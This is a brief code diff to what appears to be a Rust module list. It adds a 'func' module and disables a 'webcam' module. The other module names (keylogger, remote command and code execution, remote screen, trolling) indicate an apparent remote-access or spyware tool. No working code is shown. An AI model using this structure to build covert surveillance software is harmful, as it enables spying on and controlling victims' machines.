@@ -1,10 +1,11 @@
 pub mod audio;
 pub mod chat;
 pub mod file_system;
+pub mod func;
 pub mod keylogger;
 pub mod remote_cmd;
 pub mod remote_code_execution;
 pub mod remote_screen;
 pub mod task_manager;
 pub mod trolling;
-pub mod webcam;
+// pub mod webcam;
